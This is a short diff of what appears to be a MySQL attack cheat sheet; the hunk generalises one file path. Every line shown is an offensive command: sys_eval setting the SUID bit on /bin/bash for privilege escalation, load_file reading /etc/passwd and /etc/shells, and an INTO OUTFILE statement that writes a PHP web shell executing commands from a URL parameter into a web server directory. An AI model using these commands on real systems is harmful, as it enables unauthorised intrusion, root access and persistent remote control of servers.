@@ -24,4 +24,4 @@ select sys_eval("chmod u+s /bin/bash");
 select load_file("/etc/shells");
 select load_file("/etc/passwd");
 
-SELECT "<?php echo system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/wp-content/uploads/shell.php";
+SELECT "<?php echo system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/<<directory>>/shell.php";
